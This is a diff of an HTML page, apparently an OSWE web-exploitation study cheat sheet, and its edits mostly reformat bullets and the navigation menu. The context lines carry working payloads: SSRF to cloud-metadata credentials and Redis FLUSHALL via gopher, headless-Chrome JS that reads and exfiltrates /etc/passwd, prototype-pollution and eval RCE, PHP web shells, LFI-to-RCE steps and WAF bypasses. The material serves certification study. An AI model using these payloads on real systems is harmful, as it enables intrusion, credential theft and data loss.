-              <ul><li>SSRF coverage here includes blind SSRF, internal port scanning, headless Chrome JS injection, and the Kong Admin API takeover. Anywhere a parameter takes a URL or hostname is a candidate.</li></ul>
+              <ul>
+                <li>Includes blind SSRF, internal port scanning, headless Chrome JS injection, and the Kong Admin API takeover</li>
+                <li>Anywhere a parameter takes a URL or hostname is a candidate</li>
+              </ul>
               <h3 id="oswe-ssrf-basics">10.1 Finding &amp; Exploiting SSRF</h3>
-              <ul><li>Any URL-accepting parameter is a candidate: <code>url</code>, <code>host</code>, <code>callback</code>, <code>fetch</code>, <code>webhook</code>, <code>redirect</code>, <code>imageurl</code>, <code>proxy</code>, <code>src</code>. Common targets are cloud metadata (AWS IMDSv1 at 169.254.169.254), internal admin panels, Redis, Consul, and the Docker socket.</li></ul>
+              <ul>
+                <li>URL-accepting parameters: <code>url</code>, <code>host</code>, <code>callback</code>, <code>fetch</code>, <code>webhook</code>, <code>redirect</code>, <code>imageurl</code>, <code>proxy</code>, <code>src</code></li>
+                <li>Common targets: cloud metadata (AWS IMDSv1 at 169.254.169.254), internal admin panels, Redis, Consul, Docker socket</li>
+              </ul>
               <pre><code class="language-bash"># Cloud metadata (AWS IMDSv1)
 url=http://169.254.169.254/latest/meta-data/
 url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -908,7 +2326,10 @@ url=http://192.168.1.1:6379/                  # Redis
 url=http://localhost:8500/v1/kv/              # Consul
 url=http://127.0.0.1:2375/containers/json     # Docker API (unauth)</code></pre>
               <h3 id="oswe-ssrf-verb-tamper">10.2 API Discovery via Verb Tampering</h3>
-              <ul><li>Microservices behind an SSRF often expose admin actions on undocumented verbs (<code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>) gated only by a 405 check that doesn&rsquo;t list real verbs. The course&rsquo;s Directus chain enumerates endpoints by swapping the verb until a previously hidden response surfaces.</li></ul>
+              <ul>
+                <li>Microservices behind SSRF often expose admin actions on undocumented verbs (<code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>)</li>
+                <li>Directus chain enumerates endpoints by swapping the verb until a hidden response surfaces</li>
+              </ul>
               <pre><code class="language-bash">for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do
   echo "[$V]"
   curl -s -o /dev/null -w "%{http_code} " -X $V http://target/api/admin/users
@@ -916,7 +2337,9 @@ done
 
 # An endpoint that returns 401 on GET and 200 on PUT is a verb-tampering signal.</code></pre>
               <h3 id="oswe-ssrf-bypass">10.3 SSRF Filter Bypass</h3>
-              <ul><li>Allowlists checking string prefixes are bypassed with IP-form obfuscation, DNS rebinding through services like nip.io, and authority-section confusion (<code>@</code>, <code>#</code>, encoded space).</li></ul>
+              <ul>
+                <li>Allowlists checking string prefixes are bypassed with IP-form obfuscation, DNS rebinding via nip.io, and authority-section confusion (<code>@</code>, <code>#</code>, encoded space)</li>
+              </ul>
               <pre><code class="language-bash"># IP obfuscation
 url=http://0177.0.0.1/           # octal
 url=http://2130706433/           # decimal
@@ -937,7 +2360,10 @@ url=http://127.0.0.1%20@attacker.com/   # space encoding
 # Gopher for raw TCP to Redis, SMTP, MySQL
 url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20key%20hacked%0d%0a</code></pre>
               <h3 id="oswe-ssrf-blind-portscan">10.4 Blind SSRF Port Scanning</h3>
-              <ul><li>When the SSRF response is fully blind, time differences become the oracle: a port that returns RST is fast, a port that accepts and waits for protocol bytes is slow. Sweep a subnet from a single SSRF primitive.</li></ul>
+              <ul>
+                <li>When SSRF response is fully blind, time differences become the oracle</li>
+                <li>Port returning RST is fast; port accepting and waiting for protocol bytes is slow</li>
+              </ul>
               <pre><code class="language-python">import requests, time
 def probe(host, port):
     t0 = time.time()
@@ -953,7 +2379,11 @@ for ip in [f"10.0.0.{i}" for i in range(1, 255)]:
         if dt &gt; 1.5:    # slow response -&gt; likely open
             print(f"[+] {ip}:{p} - {dt:.1f}s")</code></pre>
               <h3 id="oswe-ssrf-chain">10.5 Headless Chrome / PDF Renderer SSRF Chain</h3>
-              <ul><li>Apps that render user HTML server-side (PDF generators, screenshot services) feed it to headless Chrome. Inject JS that reads <code>file://</code> or hits the metadata service, and exfiltrate via fetch or DNS. The course&rsquo;s Render-API chapter exploits this to steal credentials from the Kong Admin API.</li></ul>
+              <ul>
+                <li>Apps that render user HTML server-side (PDF generators, screenshot services) feed it to headless Chrome</li>
+                <li>Inject JS that reads <code>file://</code> or hits the metadata service, exfiltrate via fetch or DNS</li>
+                <li>Render-API chapter exploits this to steal credentials from the Kong Admin API</li>
+              </ul>
               <pre><code class="language-html">&lt;!-- Injected into a PDF/HTML field that the server renders with headless Chrome --&gt;
 &lt;script&gt;
   fetch("file:///etc/passwd")
@@ -968,9 +2398,15 @@ for ip in [f"10.0.0.{i}" for i in range(1, 255)]:
 &lt;/script&gt;</code></pre>
 
               <h2 id="oswe-prototype-pollution">11. Prototype Pollution (Node.js)</h2>
-              <ul><li>The Guacamole Lite chapter shows the modern Node.js exploitation primitive end-to-end: a recursive merge function lets attacker JSON pollute <code>Object.prototype</code>, and known template-engine gadgets turn that pollution into RCE.</li></ul>
+              <ul>
+                <li>Guacamole Lite chapter shows the modern Node.js exploitation primitive end-to-end</li>
+                <li>A recursive merge function lets attacker JSON pollute <code>Object.prototype</code>, and known template-engine gadgets turn that into RCE</li>
+              </ul>
               <h3 id="oswe-pp-concept">11.1 Concept</h3>
-              <ul><li>JavaScript&rsquo;s prototype chain means every object inherits from <code>Object.prototype</code>. If attacker input reaches <code>obj[key] = value</code> where <code>key</code> can be <code>__proto__</code> or <code>constructor.prototype</code>, the attacker adds properties to <em>every</em> object in the process &mdash; including config defaults, template options, and middleware behavior.</li></ul>
+              <ul>
+                <li>JavaScript prototype chain: every object inherits from <code>Object.prototype</code></li>
+                <li>If attacker input reaches <code>obj[key] = value</code> where key can be <code>__proto__</code> or <code>constructor.prototype</code>, attacker adds properties to <em>every</em> object in the process</li>
+              </ul>
               <pre><code class="language-javascript">// Vulnerable recursive merge
 function merge(dst, src) {
   for (let k in src) { dst[k] = src[k]; }  // no prototype check!
@@ -978,7 +2414,11 @@ function merge(dst, src) {
 // Attacker payload: {"__proto__": {"isAdmin": true}}
 // After merge: ({}).isAdmin === true  (every object "is admin")</code></pre>
               <h3 id="oswe-pp-find">11.2 Finding &amp; Discovering Pollution Sinks</h3>
-              <ul><li>Blackbox: post <code>{"__proto__":{"polluted":true}}</code> to JSON endpoints, then look for response headers, debug pages, or behaviors that reflect the polluted property. Whitebox: grep for unsafe recursive merge/extend/clone without a <code>hasOwnProperty</code> guard; check dependency versions for known-vulnerable lodash (&lt; 4.17.12), jQuery (&lt; 3.4), and minimist.</li></ul>
+              <ul>
+                <li>Blackbox: post <code>{"__proto__":{"polluted":true}}</code> to JSON endpoints, check for reflected properties</li>
+                <li>Whitebox: grep for unsafe recursive merge/extend/clone without <code>hasOwnProperty</code> guard</li>
+                <li>Check dependency versions for known-vulnerable lodash (&lt; 4.17.12), jQuery (&lt; 3.4), minimist</li>
+              </ul>
               <pre><code class="language-bash"># Whitebox: hunt for unsafe deep merge / assign / recursive clone
 grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/ | grep -v "Object.assign"
 # Look for: obj[key] = val without hasOwnProperty check, vulnerable lodash, jQuery, minimist
@@ -987,7 +2427,10 @@ grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/ | grep -v "Object.assign"
 # POST {"__proto__":{"polluted":true}} to any JSON endpoint
 # Then check: GET /health -&gt; response headers or body may reflect properties</code></pre>
               <h3 id="oswe-pp-gadgets">11.3 RCE Gadgets (EJS, Handlebars, Pug)</h3>
-              <ul><li>Pollution alone rarely RCE&rsquo;s; you need a gadget &mdash; a downstream consumer that reads a polluted property and uses it as code. The Guacamole Lite chapter chains pollution + EJS + Handlebars to RCE.</li></ul>
+              <ul>
+                <li>Pollution alone rarely RCE&rsquo;s; you need a gadget &mdash; a downstream consumer that reads a polluted property and uses it as code</li>
+                <li>Guacamole Lite chapter chains pollution + EJS + Handlebars to RCE</li>
+              </ul>
               <table class="custom-table">
                 <thead><tr><th>Gadget</th><th>Polluted Property</th><th>Effect</th></tr></thead>
                 <tbody>
@@ -1011,9 +2454,16 @@ grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/ | grep -v "Object.assign"
 {"__proto__":{"pendingContent":"&lt;%= global.process.mainModule.require('child_process').execSync('id') %&gt;"}}</code></pre>
 
               <h2 id="oswe-rce-eval">12. Command Injection &amp; Eval/Filter Bypass</h2>
-              <ul><li>The Dolibarr chapter shows a real-world filter bypass against PHP <code>eval()</code>: a blocklist of dangerous keywords is defeated with reflection, alternate encodings, and string-construction tricks. The same patterns apply to <code>eval</code> in Python and Node.js.</li></ul>
+              <ul>
+                <li>Dolibarr chapter shows a real-world filter bypass against PHP <code>eval()</code></li>
+                <li>Blocklist of dangerous keywords defeated with reflection, alternate encodings, and string-construction tricks</li>
+              </ul>
               <h3 id="oswe-cmdi-php">12.1 PHP Command Injection &amp; eval()</h3>
-              <ul><li>Dangerous PHP sinks: <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>popen()</code>, <code>proc_open()</code>, backtick operator, and <code>eval()</code>. Inject metacharacters &mdash; <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>$(...)</code>, backticks &mdash; or, for <code>eval()</code>, construct equivalent code that bypasses the filter.</li></ul>
+              <ul>
+                <li>Dangerous sinks: <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>popen()</code>, <code>proc_open()</code>, backtick operator, <code>eval()</code></li>
+                <li>Inject metacharacters: <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>$(...)</code>, backticks</li>
+                <li>For <code>eval()</code>, construct equivalent code that bypasses the filter</li>
+              </ul>
               <pre><code class="language-php">// Sink pattern
 system("ping -c 1 " . $_GET['host']);    // inject: 127.0.0.1; id
 
@@ -1031,7 +2481,10 @@ $f($_GET['c']);
 $fn = $_GET['fn']; $fn($cmd);  // call any function by name from a parameter
 // Alternate encodings: system -&gt; "system" via Unicode</code></pre>
               <h3 id="oswe-cmdi-python">12.2 Python eval / exec Injection</h3>
-              <ul><li>Raw <code>eval()</code> on user input is straight RCE. Sandboxed <code>eval()</code> (no builtins) can still escape via the class hierarchy &mdash; the same trick as Jinja2 SSTI.</li></ul>
+              <ul>
+                <li>Raw <code>eval()</code> on user input is straight RCE</li>
+                <li>Sandboxed <code>eval()</code> (no builtins) can still escape via the class hierarchy &mdash; same trick as Jinja2 SSTI</li>
+              </ul>
               <pre><code class="language-python"># eval() with user input -&gt; straight RCE
 eval("__import__('os').system('id')")
 
@@ -1039,7 +2492,10 @@ eval("__import__('os').system('id')")
 ().__class__.__base__.__subclasses__()       # find &lt;class 'subprocess.Popen'&gt;
 ().__class__.__base__.__subclasses__()[N](['id'], stdout=-1).communicate()</code></pre>
               <h3 id="oswe-cmdi-node">12.3 Node.js exec / spawn / Function()</h3>
-              <ul><li>Template-literal concatenation into a shell command is a CSI primitive. The <code>Function</code> constructor (and <code>eval</code>) compiles strings into code &mdash; never feed user input to either.</li></ul>
+              <ul>
+                <li>Template-literal concatenation into a shell command is a command injection primitive</li>
+                <li><code>Function</code> constructor and <code>eval</code> compile strings into code &mdash; never feed user input to either</li>
+              </ul>
               <pre><code class="language-javascript">// Direct injection
 require('child_process').execSync(`ping -c1 ${userInput}`);
 // Payload: ; id   OR  `id`   OR  $(id)
@@ -1051,7 +2507,10 @@ exec(cmd, callback);
 // Function constructor = eval
 const f = new Function("x", req.body.code);   // RCE via req.body.code</code></pre>
               <h3 id="oswe-cmdi-filter-bypass">12.4 Filter Bypass Tricks (Dolibarr)</h3>
-              <ul><li>When the app blocklists specific strings before calling <code>eval</code>, you defeat the blocklist by never spelling them out: reflection (call by reference, not by name), alternate encodings (Unicode escapes, hex), and string modifications (concatenation, slicing, base conversion). The Dolibarr chapter walks every form.</li></ul>
+              <ul>
+                <li>Defeat the blocklist by never spelling out the blocked strings</li>
+                <li>Techniques: reflection (call by reference), alternate encodings (Unicode, hex), string modifications (concatenation, slicing, base conversion)</li>
+              </ul>
               <pre><code class="language-php">// String concatenation
 $x = "sys" . "tem"; $x("id");
 
@@ -1068,9 +2527,16 @@ $a = "system"; $$a = "id"; ${$a}($id);   // shaped to avoid keywords appearing l
 $f = create_function('', $_GET['code']); $f();</code></pre>
 
               <h2 id="oswe-upload-lfi">13. File Upload &amp; Local File Inclusion to RCE</h2>
-              <ul><li>File-upload bypasses get you code on disk; LFI executes it. Even when the upload is constrained to images, log-poisoning or PHP-wrapper inclusion can still reach RCE.</li></ul>
+              <ul>
+                <li>File-upload bypasses get you code on disk; LFI executes it</li>
+                <li>Even when the upload is constrained to images, log-poisoning or PHP-wrapper inclusion can still reach RCE</li>
+              </ul>
               <h3 id="oswe-upload-bypass">13.1 File Upload Bypass</h3>
-              <ul><li>Defeat extension allowlists with alternate executable extensions (<code>.phtml</code>, <code>.pht</code>), case mismatches, double extensions, and magic-byte stuffing. Defeat MIME checks by tampering <code>Content-Type</code>. If the server respects <code>.htaccess</code>, upload one that remaps a benign extension to PHP.</li></ul>
+              <ul>
+                <li>Defeat extension allowlists: alternate executable extensions (<code>.phtml</code>, <code>.pht</code>), case mismatches, double extensions, magic-byte stuffing</li>
+                <li>Defeat MIME checks by tampering <code>Content-Type</code></li>
+                <li>If server respects <code>.htaccess</code>, upload one that remaps a benign extension to PHP</li>
+              </ul>
               <pre><code class="language-bash"># Extension whitelist bypass
 shell.php%00.jpg          # null byte truncation (PHP &lt; 5.3.4)
 shell.php5                # alternate extension (not in blacklist)
@@ -1090,7 +2556,10 @@ GIF89a;&lt;?php system($_GET['c']);?&gt;
 # Upload a .htaccess: AddType application/x-httpd-php .xxx
 # Then upload shell.xxx -&gt; executes as PHP</code></pre>
               <h3 id="oswe-lfi-rce">13.2 LFI &rarr; RCE Escalation</h3>
-              <ul><li>An LFI primitive reads any file the web user can read. Pivot to RCE via PHP wrappers, log poisoning, <code>/proc/self/environ</code> injection, or session file poisoning.</li></ul>
+              <ul>
+                <li>LFI reads any file the web user can read</li>
+                <li>Pivot to RCE via PHP wrappers, log poisoning, <code>/proc/self/environ</code> injection, or session file poisoning</li>
+              </ul>
               <pre><code class="language-bash"># Classic LFI
 http://target/page?file=../../../../etc/passwd
 http://target/page?file=....//....//....//etc/passwd   # if "../" is stripped
@@ -1116,11 +2585,20 @@ curl -H "PHP_VALUE: auto_prepend_file=/etc/passwd" ...
 # 2. Include /var/lib/php/sessions/sess_PHPSESSID</code></pre>
 
               <h2 id="oswe-waf-bypass">14. Web Application Firewall (WAF) Bypass</h2>
-              <ul><li>The RudderStack chapter exploits a SQL injection that&rsquo;s protected by Coraza WAF. Modern WAFs match signatures and AST patterns, not raw substrings &mdash; you bypass them by varying syntax in ways the signature didn&rsquo;t anticipate.</li></ul>
+              <ul>
+                <li>RudderStack chapter exploits SQLi protected by Coraza WAF</li>
+                <li>Modern WAFs match signatures and AST patterns, not raw substrings &mdash; bypass by varying syntax in ways the signature didn&rsquo;t anticipate</li>
+              </ul>
               <h3 id="oswe-waf-recon">14.1 Reading the Ruleset (White-Box)</h3>
-              <ul><li>White-box: the WAF rules are in the source tree. Find them (<code>coraza/conf</code>, <code>modsecurity/rules</code>, <code>.conf</code> files with <code>SecRule</code>) and read them. Identify which patterns match what, then craft inputs that don&rsquo;t match. Blackbox: send progressively benign payloads until one passes, then walk syntactically equivalent forms.</li></ul>
+              <ul>
+                <li>White-box: WAF rules are in the source tree &mdash; find them (<code>coraza/conf</code>, <code>modsecurity/rules</code>, <code>.conf</code> files with <code>SecRule</code>)</li>
+                <li>Identify which patterns match what, then craft inputs that don&rsquo;t match</li>
+                <li>Blackbox: send progressively benign payloads until one passes, then walk syntactically equivalent forms</li>
+              </ul>
               <h3 id="oswe-waf-sqli">14.2 WAF Bypass for SQLi</h3>
-              <ul><li>Vary case, inject inline comments, swap whitespace for tabs/newlines/parentheses, double-encode, switch keywords for synonyms.</li></ul>
+              <ul>
+                <li>Vary case, inject inline comments, swap whitespace for tabs/newlines/parentheses, double-encode, switch keywords for synonyms</li>
+              </ul>
               <pre><code class="language-sql">-- Case variation / mixed case
 SeLeCt 1 FrOm InFoRmAtIoN_sCHeMa.TaBlEs
 
@@ -1144,7 +2622,10 @@ WHERE id=1          -&gt;  WHERE id=0+1  or  WHERE id=1.0
 -- Scientific notation / type tricks (MySQL)
 id=1e0              -- 1e0 = 1.0 = 1 (integer context)</code></pre>
               <h3 id="oswe-waf-xss">14.3 WAF Bypass for XSS</h3>
-              <ul><li>Same idea, different syntax space: alternate event handlers, HTML-entity encoding, JS string escaping, template literals, and CSP holes via whitelisted CDNs that ship eval-able libraries.</li></ul>
+              <ul>
+                <li>Alternate event handlers, HTML-entity encoding, JS string escaping, template literals</li>
+                <li>CSP holes via whitelisted CDNs that ship eval-able libraries</li>
+              </ul>
               <pre><code class="language-html">&lt;!-- Event handler variations --&gt;
 &lt;svg onload=alert(1)&gt;
 &lt;img src=x onerror=alert(1)&gt;
@@ -1165,7 +2646,9 @@ id=1e0              -- 1e0 = 1.0 = 1 (integer context)</code></pre>
 &lt;script src="https://cdn.trusted.com/angular.js"&gt;&lt;/script&gt;
 &lt;div ng-app ng-csp&gt;{{$on.constructor('alert(1)')()}}&lt;/div&gt;</code></pre>
               <h3 id="oswe-waf-ssti">14.4 WAF Bypass for SSTI</h3>
-              <ul><li>Same arsenal: hex-encode attribute names, build keywords from concatenation, switch from <code>.</code> to <code>|attr()</code>, switch from <code>[]</code> to <code>getattr()</code>.</li></ul>
+              <ul>
+                <li>Hex-encode attribute names, build keywords from concatenation, switch from <code>.</code> to <code>|attr()</code>, switch from <code>[]</code> to <code>getattr()</code></li>
+              </ul>
               <pre><code class="language-python"># Bypass "." filter in Jinja2
 request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
 # Bypass underscore filter
@@ -1199,13 +2682,116 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
     </div>
     <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
     <div class="section-flow-1">
-      <button class="dropdown-btn">1. Tools &amp; Setup
+      <button class="dropdown-btn">1. Methodology
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-lab-setup">1.1 Lab Environment</a>
-        <a href="#oswe-script-skeleton">1.2 Exploit Script Skeleton</a>
-        <a href="#oswe-source-recovery">1.3 Source Code Recovery (.NET &amp; Java)</a>
+        <button class="dropdown-btn">1.1 Source Code Review
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-source-review-route-mapping">1.1.1 Route & Endpoint Mapping</a>
+          <a href="#methodology-source-review-sink-identification">1.1.2 Dangerous Sink Identification</a>
+          <a href="#methodology-source-review-taint-tracing">1.1.3 Taint Tracing</a>
+          <a href="#methodology-source-review-debugger-setup">1.1.4 Debugger Setup</a>
+          </div>
+        <button class="dropdown-btn">1.2 Authentication Bypass
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-auth-bypass-sqli-auth">1.2.1 SQL Injection Auth Bypass</a>
+          <a href="#methodology-auth-bypass-type-juggling">1.2.2 Type Juggling & Magic Hashes</a>
+          <a href="#methodology-auth-bypass-jwt-attacks">1.2.3 JWT Attacks</a>
+          <a href="#methodology-auth-bypass-password-reset">1.2.4 Password Reset Flaws</a>
+          </div>
+        <button class="dropdown-btn">1.3 SQL Injection to RCE
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-sqli-rce-db-fingerprint">1.3.1 Database Fingerprinting</a>
+          <a href="#methodology-sqli-rce-file-write">1.3.2 File Write to Webshell</a>
+          <a href="#methodology-sqli-rce-os-command">1.3.3 OS Command Execution</a>
+          <a href="#methodology-sqli-rce-blind-extraction">1.3.4 Blind Data Extraction</a>
+          </div>
+        <button class="dropdown-btn">1.4 Cross-Site Scripting to Account Takeover
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-xss-reflection">1.4.1 Reflection Discovery</a>
+          <a href="#methodology-xss-payload-crafting">1.4.2 Payload Crafting</a>
+          <a href="#methodology-xss-session-theft">1.4.3 Cookie & Session Theft</a>
+          <a href="#methodology-xss-admin-actions">1.4.4 XSS to Admin Actions</a>
+          </div>
+        <button class="dropdown-btn">1.5 Server-Side Template Injection
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-ssti-detection">1.5.1 Template Engine Detection</a>
+          <a href="#methodology-ssti-jinja2">1.5.2 Jinja2 / Flask Exploitation</a>
+          <a href="#methodology-ssti-other-engines">1.5.3 Other Template Engines</a>
+          </div>
+        <button class="dropdown-btn">1.6 XML External Entity Injection
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-xxe-basic-xxe">1.6.1 Basic XXE</a>
+          <a href="#methodology-xxe-blind-xxe">1.6.2 Blind / OOB XXE</a>
+          <a href="#methodology-xxe-xxe-rce">1.6.3 XXE to RCE</a>
+          </div>
+        <button class="dropdown-btn">1.7 Insecure Deserialization
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-deserialization-java-deser">1.7.1 Java Deserialization</a>
+          <a href="#methodology-deserialization-php-deser">1.7.2 PHP Deserialization</a>
+          <a href="#methodology-deserialization-dotnet-deser">1.7.3 .NET Deserialization</a>
+          <a href="#methodology-deserialization-nodejs-deser">1.7.4 Node.js Deserialization</a>
+          </div>
+        <button class="dropdown-btn">1.8 Server-Side Request Forgery
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-ssrf-target-discovery">1.8.1 Target Discovery</a>
+          <a href="#methodology-ssrf-filter-bypass">1.8.2 Filter Bypass</a>
+          <a href="#methodology-ssrf-protocol-smuggling">1.8.3 Protocol Smuggling</a>
+          </div>
+        <button class="dropdown-btn">1.9 Prototype Pollution (Node.js)
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-proto-pollution-discovery">1.9.1 Discovery</a>
+          <a href="#methodology-proto-pollution-exploitation">1.9.2 Exploitation</a>
+          </div>
+        <button class="dropdown-btn">1.10 Command Injection & Code Execution
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-cmdinj-sink-id">1.10.1 Sink Identification</a>
+          <a href="#methodology-cmdinj-filter-bypass">1.10.2 Filter Bypass Techniques</a>
+          <a href="#methodology-cmdinj-php-bypasses">1.10.3 PHP-Specific Bypasses</a>
+          </div>
+        <button class="dropdown-btn">1.11 File Upload & LFI to RCE
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-upload-lfi-upload-bypass">1.11.1 Upload Bypass</a>
+          <a href="#methodology-upload-lfi-lfi-rce">1.11.2 LFI Exploitation</a>
+          </div>
+        <button class="dropdown-btn">1.12 WAF Bypass
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-waf-bypass-sqli-waf">1.12.1 SQLi WAF Bypass</a>
+          <a href="#methodology-waf-bypass-xss-waf">1.12.2 XSS WAF Bypass</a>
+          </div>
+        <button class="dropdown-btn">1.13 Exploit Scripting
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#methodology-exploit-scripting-skeleton">1.13.1 Python Exploit Skeleton</a>
+          </div>
+        <a href="#oswe-script-skeleton">1.14 Exploit Script Skeleton</a>
+        <a href="#oswe-source-recovery">1.15 Source Code Recovery (.NET & Java)</a>
       </div>
     </div>
     <div class="section-flow-2">
@@ -1226,38 +2812,38 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
       </button>
       <div class="dropdown-container">
         <a href="#oswe-sqli-auth">3.1 SQL Injection Auth Bypass</a>
-        <a href="#oswe-type-confusion">3.2 Type Confusion &amp; PHP Loose Comparisons</a>
+        <a href="#oswe-type-confusion">3.2 Type Confusion & PHP Loose Comparisons</a>
         <a href="#oswe-jwt-bypass">3.3 JWT Attacks</a>
         <a href="#oswe-reset-bypass">3.4 Password Reset Logic Flaws</a>
       </div>
     </div>
     <div class="section-flow-4">
-      <button class="dropdown-btn">4. SQL Injection &rarr; RCE
+      <button class="dropdown-btn">4. SQL Injection → RCE
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-sqli-enum">4.1 Enumeration &amp; Fingerprinting</a>
+        <a href="#oswe-sqli-enum">4.1 Enumeration & Fingerprinting</a>
         <a href="#oswe-sqli-read-write">4.2 File Read / Write via SQLi</a>
         <a href="#oswe-pg-udf">4.3 PostgreSQL UDF / Extension RCE</a>
-        <a href="#oswe-sqli-stacked">4.4 Stacked Queries &amp; Stored Procedures</a>
+        <a href="#oswe-sqli-stacked">4.4 Stacked Queries & Stored Procedures</a>
         <a href="#oswe-sqli-blind">4.5 Blind / Time-Based SQLi</a>
       </div>
     </div>
     <div class="section-flow-5">
-      <button class="dropdown-btn">5. Cross-Site Scripting &rarr; Account Takeover
+      <button class="dropdown-btn">5. Cross-Site Scripting → Account Takeover
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-xss-recon">5.1 Finding &amp; Confirming XSS</a>
+        <a href="#oswe-xss-recon">5.1 Finding & Confirming XSS</a>
         <a href="#oswe-xss-dom">5.2 DOM-Based XSS</a>
         <a href="#oswe-xss-cookie-steal">5.3 Session Cookie / Token Exfiltration</a>
         <a href="#oswe-xss-csrf">5.4 XSS to CSRF Chain (Admin Action)</a>
-        <a href="#oswe-xss-stored">5.5 Stored XSS &rarr; Persistent Admin Backdoor</a>
+        <a href="#oswe-xss-stored">5.5 Stored XSS → Persistent Admin Backdoor</a>
         <a href="#oswe-xss-dom-store">5.6 Persisting XSS Loot via IndexedDB / WebSockets</a>
       </div>
     </div>
     <div class="section-flow-6">
-      <button class="dropdown-btn">6. CSRF, CORS &amp; SameSite Bypass
+      <button class="dropdown-btn">6. CSRF, CORS & SameSite Bypass
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -1286,10 +2872,10 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-xxe-basics">8.1 XML Entities &amp; Vulnerable Parsers</a>
+        <a href="#oswe-xxe-basics">8.1 XML Entities & Vulnerable Parsers</a>
         <a href="#oswe-xxe-blind">8.2 Blind / OOB XXE with Parameter Entities</a>
-        <a href="#oswe-xxe-cdata">8.3 CDATA Trick for Files Containing &lt;, &amp;, &gt;</a>
-        <a href="#oswe-xxe-rce">8.4 XXE &rarr; RCE Paths</a>
+        <a href="#oswe-xxe-cdata">8.3 CDATA Trick for Files Containing &lt;, &, &gt;</a>
+        <a href="#oswe-xxe-rce">8.4 XXE → RCE Paths</a>
       </div>
     </div>
     <div class="section-flow-9">
@@ -1309,7 +2895,7 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-ssrf-basics">10.1 Finding &amp; Exploiting SSRF</a>
+        <a href="#oswe-ssrf-basics">10.1 Finding & Exploiting SSRF</a>
         <a href="#oswe-ssrf-verb-tamper">10.2 API Discovery via Verb Tampering</a>
         <a href="#oswe-ssrf-bypass">10.3 SSRF Filter Bypass</a>
         <a href="#oswe-ssrf-blind-portscan">10.4 Blind SSRF Port Scanning</a>
@@ -1322,28 +2908,28 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
       </button>
       <div class="dropdown-container">
         <a href="#oswe-pp-concept">11.1 Concept</a>
-        <a href="#oswe-pp-find">11.2 Finding &amp; Discovering Pollution Sinks</a>
+        <a href="#oswe-pp-find">11.2 Finding & Discovering Pollution Sinks</a>
         <a href="#oswe-pp-gadgets">11.3 RCE Gadgets (EJS, Handlebars, Pug)</a>
       </div>
     </div>
     <div class="section-flow-12">
-      <button class="dropdown-btn">12. Command Injection &amp; Eval/Filter Bypass
+      <button class="dropdown-btn">12. Command Injection & Eval/Filter Bypass
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#oswe-cmdi-php">12.1 PHP Command Injection &amp; eval()</a>
+        <a href="#oswe-cmdi-php">12.1 PHP Command Injection & eval()</a>
         <a href="#oswe-cmdi-python">12.2 Python eval / exec Injection</a>
         <a href="#oswe-cmdi-node">12.3 Node.js exec / spawn / Function()</a>
         <a href="#oswe-cmdi-filter-bypass">12.4 Filter Bypass Tricks (Dolibarr)</a>
       </div>
     </div>
     <div class="section-flow-13">
-      <button class="dropdown-btn">13. File Upload &amp; Local File Inclusion to RCE
+      <button class="dropdown-btn">13. File Upload & Local File Inclusion to RCE
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
         <a href="#oswe-upload-bypass">13.1 File Upload Bypass</a>
-        <a href="#oswe-lfi-rce">13.2 LFI &rarr; RCE Escalation</a>
+        <a href="#oswe-lfi-rce">13.2 LFI → RCE Escalation</a>
       </div>
     </div>
     <div class="section-flow-14">
